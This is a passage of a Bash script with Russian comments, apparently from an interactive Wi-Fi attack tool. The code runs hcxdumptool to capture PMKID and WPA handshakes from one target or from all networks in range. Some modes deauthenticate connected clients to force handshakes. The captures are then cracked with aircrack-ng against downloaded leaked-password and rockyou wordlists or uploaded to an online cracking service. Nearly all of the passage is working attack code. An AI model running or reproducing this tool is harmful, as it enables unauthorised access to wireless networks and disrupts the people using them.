# Меню атак для выбранной сети (индекс). Esc/Отмена → назад к таблице.
# ── PMKID: захват → конвертация → взлом (онлайн/база/сохранить) ────────
WPASEC_KEY_FILE="$DATA_DIR/.wpasec_key"
CRACKED_BASE="$DATA_DIR/cracked.txt"

# ── Подсветка живого потока hcxdumptool по типу фрейма ──
# Улов (PMKID/EAPOL) — зелёным жирным; предвестники (AUTH/ASSOC) — жёлтым;
# шум (BEACON/PROBERESPONSE) — тускло-серым. Всё остальное (стартовая инфа) — как есть.
# Использует awk с fflush() для мгновенного (небуферизованного) вывода строк.
# Подсветка живого потока. $1 = MAC цели (BSSID без разделителей, опц.) —
# строки этой сети выделяются голубым, чтобы не путать с rogue-приманками.
hcx_colorize() {
    local tgt="${1:-}"
    awk -v tgt="$tgt" '
    {
        line=$0
        lc=tolower(line)
        is_tgt = (tgt != "" && index(lc, tolower(tgt)) > 0)
        if (line ~ /PMKID|EAPOL/)                 { printf "\033[1;32m%s\033[0m\n", line }   # зелёный жирный = улов (приоритет)
        else if (is_tgt)                          { printf "\033[1;36m%s\033[0m\n", line }   # голубой жирный = ТВОЯ ЦЕЛЬ
        else if (line ~ /AUTHENTICATION|ASSOCIATION|REASSOCIATION/) { printf "\033[0;33m%s\033[0m\n", line }  # жёлтый = предвестник
        else if (line ~ /BEACON|PROBERESPONSE/)   { printf "\033[0;90m%s\033[0m\n", line }   # серый = шум
        else                                       { print line }
        fflush()
    }'
}
# Запуск hcxdumptool с живой подсветкой, если есть stdbuf (иначе — прямой вывод).
# $@ = аргументы hcxdumptool
run_hcx() {
    # Захват ПОЛНОСТЬЮ изолирован от сигналов терминала.
    # Механика: hcxdumptool запускается в отдельной сессии (setsid) — Ctrl+C
    # с клавиатуры НЕ доходит ни до него, ни до скрипта. Родитель в цикле
    # следит: (а) жив ли захват, (б) не нажал ли юзер клавишу для остановки.
    # Любая клавиша (Enter/Esc/пробел/Ctrl+C-как-символ) — мягкая остановка.
    local logpipe rc
    # цель для подсветки (BSSID без разделителей) — ставится вызывающим в HCX_TARGET
    local ctgt="${HCX_TARGET:-}"
    # запускаем в НОВОЙ сессии, вывод через подсветку; PID пишем в переменную
    if command -v stdbuf >/dev/null 2>&1; then
        setsid bash -c 'stdbuf -oL hcxdumptool "$@" 2>&1' _ "$@" | hcx_colorize "$ctgt" &
    else
        setsid bash -c 'hcxdumptool "$@" 2>&1' _ "$@" | hcx_colorize "$ctgt" &
    fi
    local pgid=$!            # PID группы пайпа
    # ловим реальный PID hcxdumptool (в новой сессии) для остановки
    local hpid="" tries=0
    while [ -z "$hpid" ] && [ $tries -lt 20 ]; do
        hpid=$(pgrep -n -f "hcxdumptool -i $MON" 2>/dev/null)
        [ -z "$hpid" ] && { sleep 0.2; tries=$((tries+1)); }
    done
    # на время захвата глушим INT в самом скрипте (страховка)
    trap ':' INT
    # цикл наблюдения: пока захват жив — ждём нажатия клавиши (стоп)
    local k
    while kill -0 "$pgid" 2>/dev/null; do
        # читаем клавишу с коротким таймаутом; любое нажатие = стоп
        if IFS= read -rsn1 -t 1 k 2>/dev/null; then
            break
        fi
    done
    # останавливаем захват: сначала мягко (INT/TERM), затем гарантированно (KILL)
    [ -n "$hpid" ] && kill -INT "$hpid" 2>/dev/null
    kill -INT "$pgid" 2>/dev/null
    sleep 0.3
    [ -n "$hpid" ] && kill -TERM "$hpid" 2>/dev/null
    kill "$pgid" 2>/dev/null
    sleep 0.2
    pkill -f "hcxdumptool -i $MON" 2>/dev/null
    sleep 0.2
    pkill -9 -f "hcxdumptool -i $MON" 2>/dev/null   # гарантия: не оставляем хвостов
    wait "$pgid" 2>/dev/null
    trap ':' INT
    return 0
}

# Полный пайплайн PMKID для выбранной сети (bssid, канал, essid)
pmkid_pipeline() {
    local b="$1" ch="$2" essid="$3"
    # hcxdumptool обязателен
    if ! command -v hcxdumptool >/dev/null 2>&1; then
        echo -e "\n${RED}$(t err_hcx)${NC}"; sleep 2; return
    fi
    # нужен монитор-интерфейс (hcxdumptool 6.2.9 работает через него)
    if [ -z "$MON" ]; then
        echo -e "\n${RED}$(t msg_nomon)${NC}"; sleep 2; return
    fi
    local stamp cap hash secs mode tag
    stamp=$(stamp_now)

    # цель есть? (b задан) → показываем активный режим; нет → скан всего эфира
    local has_target=0
    [ -n "$b" ] && has_target=1
    if [ "$has_target" -eq 1 ]; then
        tag=$(sanitize_tag "$essid" "$b")
    else
        essid="$(t pmk_alltgt)"; ch="*"; tag="air"
    fi
    cap="$PMKID_DIR/pmkid_${tag}_${stamp}.pcapng"
    hash="$PMKID_DIR/pmkid_${tag}_${stamp}.22000"

    # ── Шаг 1: режим захвата ──
    local msel=0 options=(
        "${WHITE}|$(t pmk_timer)"
        "${WHITE}|$(t pmk_auto)"
        "${WHITE}|$(t pmk_manual)"
    )
    # активные режимы (deauth по цели) — только когда выбрана конкретная сеть
    if [ "$has_target" -eq 1 ]; then
        options+=("${MAGENTA}|$(t pmk_active)")
        options+=("${MAGENTA}|$(t pmk_hs_full)")
    fi
    options+=("${RED}|$(t atk_cancel)")
    while true; do
        clear
        echo -e "${CYAN}${BOLD}  $(t pmk_mode_t)${NC}"
        echo -e " ${YELLOW}ESSID:${NC} $essid   ${YELLOW}Ch:${NC} $ch\n"
        local i
        for i in "${!options[@]}"; do
            local color="${options[i]%%|*}" text="${options[i]#*|}"
            if [ "$i" -eq "$msel" ]; then echo -e "${BG_SEL} $((i+1)) ${text} ${NC}"
            else echo -e "${color} $((i+1)) ${text}${NC}"; fi
        done
        echo -e "\n${CYAN}$(t hint)${NC}"
        local key; key=$(read_key); local num="${key#num:}"
        [ "$key" = "enter" ] && num=$((msel+1))
        case "$key" in
            up)   ((msel>0)) && ((msel--)) ;;
            down) ((msel<${#options[@]}-1)) && ((msel++)) ;;
            esc)  return ;;
            enter|num:*)
                # номер вне диапазона видимых пунктов — игнор
                [ "$num" -ge 1 ] && [ "$num" -le "${#options[@]}" ] || continue
                local sel_text="${options[$((num-1))]#*|}"
                case "$sel_text" in
                    "$(t pmk_timer)")  mode=timer;  break ;;
                    "$(t pmk_auto)")   mode=auto;   break ;;
                    "$(t pmk_manual)") mode=manual; break ;;
                    "$(t pmk_active)") mode=active; break ;;
                    "$(t pmk_hs_full)") mode=handshake; break ;;
                    "$(t atk_cancel)") return ;;
                esac ;;
        esac
    done

    # ── Шаг 2: захват (hcxdumptool 6.2.9 через монитор $MON) ──
    # ВАЖНО: hcxdumptool запускается НА ПЕРЕДНЕМ ПЛАНЕ (foreground) — только так
    #        6.2.9 гонит живой поток строк (TIME/FREQ/CH/MAC/ESSID) в реальном
    #        времени, как на старых рабочих скринах. В фоне он этот поток глушит.
    # Стоп: штатный Ctrl+C самого hcxdumptool (он так и подсказывает "stop with ctrl+c").
    #       На время захвата отдаём Ctrl+C процессу hcxdumptool, скрипт не выкидывается,
    #       т.к. foreground-процесс перехватывает SIGINT первым и завершается сам.
    # "BPF is unset" — НОРМА (нет фильтра = весь эфир), не ошибка.
    local ACTV="--filterlist_ap=$b --filtermode=2"
    # ФИЛЬТР ЦЕЛИ: если выбрана конкретная сеть (has_target=1) — ловим ТОЛЬКО её
    # во всех режимах (timer/auto/manual тоже!), иначе (весь эфир) — без фильтра.
    local TGT=""
    [ "$has_target" -eq 1 ] && TGT="$ACTV"
    # Цель для ПОДСВЕТКИ в потоке (BSSID без разделителей, нижний регистр).
    # Пусто для режима "весь эфир". hcxdumptool печатает MAC как ac15a2a0764b.
    if [ "$has_target" -eq 1 ]; then
        HCX_TARGET=$(printf '%s' "$b" | tr -d ':-' | tr 'A-F' 'a-f')
    else
        HCX_TARGET=""
    fi
    clear
    echo -e "${YELLOW}$(t pmk_capturing)${NC}   ${CYAN}$(t pmk_stopctrlc)${NC}\n"
    # Захват изолирован (setsid внутри run_hcx): стоп по ЛЮБОЙ клавише,
    # Ctrl+C с клавиатуры не роняет скрипт. Страховочный trap на всякий.
    trap ':' INT
    case "$mode" in
        timer)
            prompt_input "$(t pmk_secs)" secs || { trap ':' INT; return; }
            [[ "$secs" =~ ^[0-9]+$ ]] || secs=60
            echo -e "\n${YELLOW}$(t pmk_capturing)${NC} (${secs}s)  ${CYAN}$(t pmk_stopctrlc)${NC}\n"
            # фоновый killer остановит захват через $secs; Ctrl+C прервёт раньше (run_hcx ловит)
            ( sleep "$secs"; pkill -INT -f "hcxdumptool -i $MON -o $cap" 2>/dev/null ) &
            local tkill=$!
            run_hcx -i "$MON" -o "$cap" --enable_status=31 $TGT
            kill "$tkill" 2>/dev/null
            ;;
        auto)
            # авто-стоп на первом PMKID: фоновый сторож шлёт INT в hcxdumptool.
            # hcxdumptool в foreground → живой поток виден; сторож находит PID через pgrep.
            echo -e "${YELLOW}$(t pmk_wait_auto)${NC}\n"
            ( sleep 4
              while :; do
                local hp; hp=$(pgrep -n -f "hcxdumptool -i $MON -o $cap")
                [ -z "$hp" ] && break
                if [ -s "$cap" ] && hcxpcapngtool -o /dev/null "$cap" 2>/dev/null | grep -qiP 'written to 22000.*[1-9]'; then
                    kill -INT "$hp" 2>/dev/null; break
                fi
                sleep 3
              done ) &
            local guard=$!
            run_hcx -i "$MON" -o "$cap" --enable_status=31 $TGT
            kill "$guard" 2>/dev/null
            ;;
        manual)
            run_hcx -i "$MON" -o "$cap" --enable_status=31 $TGT
            ;;
        active)
            echo -e "${MAGENTA}$(t pmk_active_run)${NC}\n"
            run_hcx -i "$MON" -o "$cap" --enable_status=31 $ACTV
            ;;
        handshake)
            # Полный handshake (M1-M4) через deauth: выбиваем клиента(ов) —
            # они переподключаются к своему AP и отдают все 4 части рукопожатия.
            # hcxdumptool 6.2.9 по умолчанию сам шлёт deauth; фильтр = только эта сеть.
            trap ':' INT
            echo -e "${CYAN}$(t hs_who)${NC}"
            echo -e " ${WHITE}1${NC} $(t hs_all)"
            echo -e " ${WHITE}2${NC} $(t hs_one)\n"
            local hk; hk=$(read_key); local hnum="${hk#num:}"
            [ "$hk" = "enter" ] && hnum=1
            trap ':' INT
            local HS_FILTER="--filterlist_ap=$b --filtermode=2"
            if [ "$hnum" = "2" ]; then
                # конкретный клиент — спросим MAC
                trap ':' INT
                local cmac; prompt_input "$(t hs_client_mac)" cmac || { trap ':' INT; HS_FILTER="--filterlist_ap=$b --filtermode=2"; }
                trap ':' INT
                # чистим MAC от разделителей (hcxdumptool ждёт 001122334455)
                cmac=$(printf '%s' "$cmac" | tr -d ':-' | tr 'A-F' 'a-f')
                [ -n "$cmac" ] && HS_FILTER="--filterlist_ap=$b --filterlist_client=$cmac --filtermode=2"
            fi
            echo -e "\n${MAGENTA}$(t hs_running)${NC}   ${CYAN}$(t pmk_stopctrlc)${NC}\n"
            run_hcx -i "$MON" -o "$cap" --enable_status=31 $HS_FILTER
            ;;
    esac
    trap ':' INT         # возвращаем глобальный предохранитель (не дефолт-убийцу)
    stty sane 2>/dev/null
    fix_owner "$PMKID_DIR" "$cap"

    # ── Шаг 3: конвертация + статистика ──
    if [ ! -f "$cap" ]; then
        echo -e "\n${RED}$(t pmk_nofile)${NC}"; press_any; return
    fi
    if ! command -v hcxpcapngtool >/dev/null 2>&1; then
        echo -e "\n${RED}$(t pmk_no_hcx)${NC}"; press_any; return
    fi
    local convout
    convout=$(hcxpcapngtool -o "$hash" "$cap" 2>&1)
    fix_owner "$hash"
    # парсим статистику из вывода hcxpcapngtool
    local n_pmkid n_hs n_net n_useless
    n_pmkid=$(echo "$convout" | grep -i 'written to 22000' | grep -oP ':\s*\K[0-9]+' | head -1)
    n_net=$(echo "$convout" | grep -i 'ESSID (total unique)' | grep -oP ':\s*\K[0-9]+' | head -1)
    n_hs=$(echo "$convout" | grep -i 'EAPOL pairs (total)' | grep -oP ':\s*\K[0-9]+' | head -1)
    n_useless=$(echo "$convout" | grep -i 'RSN PMKID (useless)' | grep -oP ':\s*\K[0-9]+' | head -1)
    [ -z "$n_pmkid" ] && n_pmkid=0; [ -z "$n_hs" ] && n_hs=0; [ -z "$n_net" ] && n_net=0; [ -z "$n_useless" ] && n_useless=0

    # умное имя: добавляем число готовых хэшей (как в логах сканов)
    if [ "$n_pmkid" -gt 0 ]; then
        local cap2="$PMKID_DIR/pmkid_${tag}_${stamp}_${n_pmkid}.pcapng"
        local hash2="$PMKID_DIR/pmkid_${tag}_${stamp}_${n_pmkid}.22000"
        mv -f "$cap" "$cap2" 2>/dev/null && cap="$cap2"
        mv -f "$hash" "$hash2" 2>/dev/null && hash="$hash2"
        fix_owner "$cap" "$hash"
    fi

    clear
    echo -e "${GREEN}${BOLD}$(t pmk_stat_t)${NC}"
    echo -e " ${YELLOW}$(t pmk_stat_net)${NC}    $n_net"
    echo -e " ${GREEN}$(t pmk_stat_pmkid)${NC}    $n_pmkid"
    echo -e " ${WHITE}$(t pmk_stat_useless)${NC} $n_useless"
    echo -e " ${YELLOW}$(t pmk_stat_hs)${NC} $n_hs"
    echo -e "\n ${WHITE}$(t pmk_saved_cap)${NC} $cap"

    # хэш пойман? (по числу записанных пар или непустому файлу)
    if [ "$n_pmkid" -eq 0 ] && [ ! -s "$hash" ]; then
        echo -e "\n${YELLOW}$(t pmk_empty)${NC}"
        press_any
        # даже без свежего улова даём зайти в меню действий (выбрать любой файл)
        pmkid_crack_menu "" "" "?"
        return
    fi
    echo -e " ${GREEN}$(t pmk_hashok)${NC} $hash"
    sleep 1; press_any

    # ── Шаг 4: что делать с хэшем ──
    pmkid_crack_menu "$hash" "$cap" "$essid"
}

# ── Вход "работа с готовым хэшем" (доступен всегда) ──
# Сразу открывает меню действий; файл выбирается внутри при необходимости.
pmkid_hash_entry() {
    pmkid_crack_menu "" "" "?"
}

# Достаёт уникальные имена сетей (ESSID) из .22000 (они там в hex, поле 6).
# $1 = путь к .pcapng или .22000. Печатает "SNR_2.4GHZ, PT_1423..." или пусто.
essids_of() {
    local f="$1" h22
    case "$f" in
        *.pcapng) h22="${f%.pcapng}.22000" ;;
        *.22000)  h22="$f" ;;
        *) return ;;
    esac
    # .22000 ещё нет (свежий захват) — создаём на лету, чтобы вытащить сети
    if [ ! -s "$h22" ] && [ -s "$f" ] && command -v hcxpcapngtool >/dev/null 2>&1; then
        case "$f" in *.pcapng)
            hcxpcapngtool -o "$h22" "$f" >/dev/null 2>&1; fix_owner "$h22" 2>/dev/null ;;
        esac
    fi
    [ -s "$h22" ] || return
    local out=""
    while read -r hx; do
        [ -z "$hx" ] && continue
        local name
        # hex → текст: python если есть (надёжно для utf-8), иначе printf
        if command -v python3 >/dev/null 2>&1; then
            name=$(python3 -c "import sys;print(bytes.fromhex(sys.argv[1]).decode('utf-8','replace'))" "$hx" 2>/dev/null)
        else
            name=$(printf '%b' "$(printf '%s' "$hx" | sed 's/\(..\)/\\x\1/g')")
        fi
        [ -n "$name" ] && { [ -n "$out" ] && out="$out, $name" || out="$name"; }
    done < <(awk -F'*' '{print $6}' "$h22" 2>/dev/null | sort -u)
    printf '%s' "$out"
}

# Выбор файла захвата из папки pmkid. Печатает путь в stdout, или пусто.
# Показываем ТОЛЬКО .pcapng (на wpa-sec грузится он; хэш из него достаётся сам),
# а рядом — какие сети внутри (вытащенные из парного .22000).
pmkid_pick_file() {
    local hsel=0
    while true; do
        local files=() f
        while IFS= read -r f; do [ -n "$f" ] && files+=("$f"); done < <(
            ls -1t "$PMKID_DIR"/*.pcapng 2>/dev/null
        )
        clear; clear >&2
        echo -e "${CYAN}${BOLD}  $(t pmk_pick_t)${NC}\n" >&2
        if [ "${#files[@]}" -eq 0 ]; then
            echo -e " ${YELLOW}$(t pmk_hash_none)${NC}\n" >&2
            echo -e " ${WHITE}1${NC} $(t pmk_hash_manual)" >&2
            echo -e " ${RED}2${NC} $(t back)\n" >&2
            echo -e "${CYAN}$(t hint)${NC}" >&2
            local key; key=$(read_key); local num="${key#num:}"
            case "$key" in
                esc) return 1 ;;
                enter|num:*)
                    case "$num" in
                        1) local hp; prompt_input "$(t pmk_hash_path)" hp >&2 || continue
                           [ -f "$hp" ] || { echo -e "${RED}$(t pmk_nofile)${NC}" >&2; sleep 2; continue; }
                           printf '%s' "$hp"; return 0 ;;
                        2) return 1 ;;
                    esac ;;
            esac
            continue
        fi
        local i
        for i in "${!files[@]}"; do
            local base nets label
            base=$(basename "${files[i]}")
            nets=$(essids_of "${files[i]}")
            # к имени добавляем сети внутри (если удалось вытащить)
            if [ -n "$nets" ]; then label="${base}  →  ${nets}"; else label="$base"; fi
            if [ "$i" -eq "$hsel" ]; then echo -e "${BG_SEL} $((i+1)) ${label} ${NC}" >&2
            else echo -e "${WHITE} $((i+1)) ${base}${CYAN}  ${nets:+→ $nets}${NC}" >&2; fi
        done
        local n_manual=$(( ${#files[@]} + 1 ))
        local n_back=$(( ${#files[@]} + 2 ))
        if [ "$hsel" -eq $((n_manual-1)) ]; then echo -e "${BG_SEL} $n_manual $(t pmk_hash_manual) ${NC}" >&2
        else echo -e "${CYAN} $n_manual $(t pmk_hash_manual)${NC}" >&2; fi
        if [ "$hsel" -eq $((n_back-1)) ]; then echo -e "${BG_SEL} $n_back $(t back) ${NC}" >&2
        else echo -e "${RED} $n_back $(t back)${NC}" >&2; fi
        echo -e "\n${CYAN}$(t hint)${NC}" >&2
        local total=$n_back
        local key; key=$(read_key); local num="${key#num:}"
        [ "$key" = "enter" ] && num=$((hsel+1))
        case "$key" in
            up)   ((hsel>0)) && ((hsel--)) ;;
            down) ((hsel<total-1)) && ((hsel++)) ;;
            esc)  return 1 ;;
            enter|num:*)
                [ "$num" -ge 1 ] && [ "$num" -le "$total" ] || continue
                if [ "$num" -eq "$n_back" ]; then return 1
                elif [ "$num" -eq "$n_manual" ]; then
                    local hp; prompt_input "$(t pmk_hash_path)" hp >&2 || continue
                    [ -f "$hp" ] || { echo -e "${RED}$(t pmk_nofile)${NC}" >&2; sleep 2; continue; }
                    printf '%s' "$hp"; return 0
                else
                    printf '%s' "${files[$((num-1))]}"; return 0
                fi ;;
        esac
    done
}

# Разложить файл на hash(.22000) + cap(.pcapng). Печатает "hash|cap".
pmkid_split_file() {
    local file="$1" hash cap
    case "$file" in
        *.22000) hash="$file"; cap="${file%.22000}.pcapng" ;;
        *.pcapng)
            cap="$file"; hash="${file%.pcapng}.22000"
            if [ ! -s "$hash" ] && command -v hcxpcapngtool >/dev/null 2>&1; then
                hcxpcapngtool -o "$hash" "$cap" >/dev/null 2>&1; fix_owner "$hash"
            fi ;;
        *) hash="$file"; cap="" ;;
    esac
    [ -s "$cap" ] || cap=""
    printf '%s|%s' "$hash" "$cap"
}

# Меню действий с готовым хэшем
pmkid_crack_menu() {
    local hash="$1" cap="$2" essid_g="$3" csel=0
    while true; do
        # опции строим каждый раз: "сохранить" — только когда хэш уже на руках
        local options=(
            "${GREEN}|$(t pmk_check_base)"
            "${CYAN}|$(t pmk_online)"
        )
        [ -s "$hash" ] && options+=("${WHITE}|$(t pmk_justsave)")
        options+=("${RED}|$(t back)")
        clear
        echo -e "${CYAN}${BOLD}  $(t pmk_next_t)${NC}\n"
        local i
        for i in "${!options[@]}"; do
            local color="${options[i]%%|*}" text="${options[i]#*|}"
            if [ "$i" -eq "$csel" ]; then echo -e "${BG_SEL} $((i+1)) ${text} ${NC}"
            else echo -e "${color} $((i+1)) ${text}${NC}"; fi
        done
        echo -e "\n${CYAN}$(t hint)${NC}"
        local key; key=$(read_key); local num="${key#num:}"
        [ "$key" = "enter" ] && num=$((csel+1))
        case "$key" in
            up)   ((csel>0)) && ((csel--)) ;;
            down) ((csel<${#options[@]}-1)) && ((csel++)) ;;
            esc)  return ;;
            enter|num:*)
                [ "$num" -ge 1 ] && [ "$num" -le "${#options[@]}" ] || continue
                local sel_text="${options[$((num-1))]#*|}"
                case "$sel_text" in
                    "$(t pmk_check_base)")
                       local h="$hash"
                       if [ ! -s "$h" ]; then
                           local pf; pf=$(pmkid_pick_file) || continue
                           local hc; hc=$(pmkid_split_file "$pf"); h="${hc%%|*}"
                       fi
                       if [ ! -s "$h" ]; then
                           clear; echo -e "\n${RED}$(t pmk_no_hash_in)${NC}"; press_any; continue
                       fi
                       pmkid_check_base "$h" ;;
                    "$(t pmk_online)")
                       # онлайн-меню открывается всегда; файл нужен только для "Залить"
                       # и запрашивается уже внутри. Передаём что есть (может быть пусто).
                       local up="$cap"; [ -s "$up" ] || up="$hash"
                       pmkid_online_menu "$up" "$essid_g" ;;
                    "$(t pmk_justsave)")
                       echo -e "\n${GREEN}$(t pmk_hashok)${NC} $hash"; press_any; return ;;
                    "$(t back)") return ;;
                esac ;;
        esac
    done
}

# ── Проверка целостности gzip (весь архив, не только начало) ──
_is_gzip() {
    [ -s "$1" ] || return 1
    local sig; sig=$(head -c2 "$1" 2>/dev/null | od -An -tx1 | tr -d ' ')
    [ "$sig" = "1f8b" ] || return 1
    gzip -t "$1" 2>/dev/null
}

# ── Автопоиск рабочего HTTP-прокси (НИЧЕГО не захардкожено) ──
# Порядок: 1) системные http_proxy/https_proxy из окружения;
#          2) типовые локальные порты прокси на localhost (Clash/v2ray/ss/privoxy).
# Печатает URL первого отвечающего прокси, или пусто. Имя программы не важно —
# проверяем только, слушает ли порт (через /dev/tcp).
find_proxy() {
    # 1) уже задан в окружении?
    local envp="${https_proxy:-${http_proxy:-${HTTPS_PROXY:-${HTTP_PROXY:-}}}}"
    if [ -n "$envp" ]; then printf '%s' "$envp"; return 0; fi
    # 2) сканируем типовые локальные порты
    local host p
    for host in 127.0.0.1 localhost; do
        for p in 7890 7897 1080 8080 8118 10809 20171 2080; do
            # порт отвечает? (bash /dev/tcp, таймаут 1с)
            if timeout 1 bash -c "exec 3<>/dev/tcp/$host/$p" 2>/dev/null; then
                printf 'http://%s:%s' "$host" "$p"; return 0
            fi
        done
    done
    return 1
}

# ── Универсальная загрузка словаря: прямо → любой прокси → ручная инструкция ──
# $1=url  $2=dest(без .gz)  $3=имя_для_вывода  $4=force?  $5=ключ_перевода_"зачем"
# Возвращает 0 если словарь готов, иначе 1 (+печатает подробную инструкцию).
fetch_dict() {
    local url="$1" dest="$2" name="$3" force="${4:-}" why="${5:-}"
    if [ -s "$dest" ] && [ "$force" != "force" ]; then return 0; fi
    local gz="$dest.gz"
    rm -f "$gz" 2>/dev/null

    # Этап 1 — быстрая проба напрямую: 1 попытка, короткий таймаут (не виснуть)
    echo -e "${YELLOW}$(t dl_direct) ${WHITE}$name${NC}...\n"
    wget --tries=1 --timeout=8 --show-progress -q -O "$gz" "$url"

    # Этап 2 — не вышло за 8с → сразу прокси (не долбим повторно напрямую)
    if ! _is_gzip "$gz"; then
        rm -f "$gz" 2>/dev/null
        local px; px=$(find_proxy)
        if [ -n "$px" ]; then
            echo -e "\n${YELLOW}$(t dl_via_proxy)${NC} ${WHITE}$px${NC}\n"
            https_proxy="$px" http_proxy="$px" \
                wget --tries=3 --timeout=30 --continue --show-progress -q -O "$gz" "$url"
        else
            echo -e "\n${YELLOW}$(t dl_no_proxy)${NC}"
        fi
    fi

    # Готово?
    if _is_gzip "$gz"; then
        echo -e "\n${YELLOW}$(t base_unpack)${NC}"
        gunzip -f "$gz" 2>/dev/null
        fix_owner "$dest"
        if [ -s "$dest" ]; then
            local sz; sz=$(du -h "$dest" 2>/dev/null | cut -f1)
            echo -e "${GREEN}$(t base_ok)${NC} ${WHITE}$dest ($sz)${NC}"
            return 0
        fi
    fi

    # Не удалось — подробная инструкция: что, где, под каким названием, зачем
    rm -f "$gz" 2>/dev/null
    echo -e "\n${RED}${BOLD}$(t dl_fail_manual) ($name)${NC}"
    echo -e "${YELLOW}$(t "$why")${NC}\n"
    echo -e "${WHITE}$(t dl_url)${NC}\n  ${CYAN}$url${NC}"
    echo -e "${WHITE}$(t dl_unpack_to)${NC}\n  ${CYAN}$dest${NC}"
    echo -e "${WHITE}$(t dl_hint_cmd)${NC}"
    echo -e "  ${CYAN}wget -O '$gz' '$url' && gunzip '$gz'${NC}"
    echo -e "${WHITE}$(t dl_after)${NC}"
    return 1
}

# URL источников словарей (без прокси в коде — прокси ищется на лету)
CRACKED_URL="https://wpa-sec.stanev.org/dict/cracked.txt.gz"
ROCKYOU_BASE="$DATA_DIR/rockyou.txt"
ROCKYOU_URL="https://raw.githubusercontent.com/teamstealthsec/wordlists/master/rockyou.txt.gz"
# Обёртки: 5-й арг — ключ перевода "зачем нужен файл / что сломается без него"
download_cracked_base() { fetch_dict "$CRACKED_URL" "$CRACKED_BASE" "cracked.txt" "${1:-}" "why_cracked"; }
download_rockyou()      { fetch_dict "$ROCKYOU_URL" "$ROCKYOU_BASE" "rockyou.txt" "${1:-}" "why_rockyou"; }

# Проверка хэша по словарям: этап 1 — cracked.txt (мгновенно),
# этап 2 (по желанию) — rockyou (~14 млн, дольше). Онлайн — отдельным пунктом меню.
pmkid_check_base() {
    local hash="$1"
    clear
    # ── Этап 1: cracked.txt (быстрая база засвеченных паролей) ──
    if [ ! -s "$CRACKED_BASE" ]; then
        download_cracked_base || { press_any; return; }
    fi
    echo -e "\n${YELLOW}$(t stage1_run)${NC}\n"
    local res
    res=$(aircrack-ng -w "$CRACKED_BASE" "$hash" 2>/dev/null | grep -i 'KEY FOUND')
    if [ -n "$res" ]; then
        echo -e "${GREEN}${BOLD}$(t pmk_cracked)${NC}"
        echo -e "${GREEN}$res${NC}"
        press_any; return
    fi
    echo -e "${YELLOW}$(t stage1_miss)${NC}\n"

    # ── Этап 2: rockyou (большой словарь) — спрашиваем, т.к. дольше ──
    echo -e "${CYAN}$(t stage2_ask)${NC}"
    echo -e "${WHITE}[Enter]${NC} $(t yes)   ${WHITE}[Esc/n]${NC} $(t no)"
    local k; IFS= read -rsn1 k
    case "$k" in
        n|N|т|Т|$'\e') echo -e "\n${YELLOW}$(t stage2_skip)${NC}"; press_any; return ;;
    esac
    # rockyou есть? нет — качаем (fetch_dict сам покажет инструкцию если не выйдет)
    if [ ! -s "$ROCKYOU_BASE" ]; then
        download_rockyou || { press_any; return; }
    fi
    echo -e "\n${YELLOW}$(t stage2_run)${NC}"
    echo -e "${WHITE}$(t stage2_wait)${NC}\n"
    res=$(aircrack-ng -w "$ROCKYOU_BASE" "$hash" 2>/dev/null | grep -i 'KEY FOUND')
    if [ -n "$res" ]; then
        echo -e "${GREEN}${BOLD}$(t pmk_cracked)${NC}"
        echo -e "${GREEN}$res${NC}"
    else
        echo -e "${YELLOW}$(t pmk_notcracked)${NC}"
    fi
    press_any
}

# ── Онлайн (wpa-sec): меню залить / проверить / журнал ──
WPASEC_LOG="$WPASEC_DIR/wpasec_uploads.txt"

# Получить/спросить ключ wpa-sec (один раз)
wpasec_get_key(){
    local key=""
    [ -f "$WPASEC_KEY_FILE" ] && key=$(cat "$WPASEC_KEY_FILE" 2>/dev/null)
    if [ -z "$key" ]; then
        # весь UI — в stderr, чтобы в stdout ушёл ТОЛЬКО ключ (мы в $(...))
        echo -e "${YELLOW}$(t pmk_need_key)${NC}" >&2
        echo -e "${CYAN}https://wpa-sec.stanev.org/ ${NC}" >&2
        prompt_input "wpa-sec key:" key >&2 || return 1
        [ -z "$key" ] && return 1
        echo "$key" > "$WPASEC_KEY_FILE"; fix_owner "$WPASEC_KEY_FILE"
    fi
    printf '%s' "$key"
}

pmkid_online_menu(){
    local cap="$1" essid="$2" osel=0
    local options=(
        "${GREEN}|$(t pmk_up_new)"
        "${CYAN}|$(t pmk_up_check)"
        "${WHITE}|$(t pmk_up_log)"
        "${RED}|$(t atk_cancel)"
    )
    while true; do
        clear
        echo -e "${CYAN}${BOLD}  $(t pmk_online)${NC}\n"
        local i
        for i in "${!options[@]}"; do
            local color="${options[i]%%|*}" text="${options[i]#*|}"
            if [ "$i" -eq "$osel" ]; then echo -e "${BG_SEL} $((i+1)) ${text} ${NC}"
            else echo -e "${color} $((i+1)) ${text}${NC}"; fi
        done
        echo -e "\n${CYAN}$(t hint)${NC}"
        local key; key=$(read_key); local num="${key#num:}"
        [ "$key" = "enter" ] && num=$((osel+1))
        case "$key" in
            up)   ((osel>0)) && ((osel--)) ;;
            down) ((osel<${#options[@]}-1)) && ((osel++)) ;;
